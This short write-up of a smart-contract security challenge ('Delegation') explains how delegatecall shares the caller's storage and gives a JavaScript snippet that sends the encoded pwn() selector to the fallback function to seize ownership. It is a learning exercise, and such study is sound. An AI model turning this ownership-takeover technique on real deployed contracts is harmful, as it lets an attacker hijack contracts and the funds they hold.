# Day 6 - Delegation

DelegateCall means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract. Since msg.sender, msg.data, msg.value are all preserved when performing a DelegateCall, you just needed to pass in a malicious msg.data i.e. the encoded payload of pwn() function to gain ownership of the Delegation contract.

Invoke the fallback function in Delegation contract to delegatecall `pwn()`

```js
const data = web3.eth.abi.encodeFunctionSignature({
	name: "pwn",
	type: "function",
	inputs: [],
});

// contract.sendTransaction will invoke callback function in Delegation.sol
await contract.sendTransaction({ data });
```
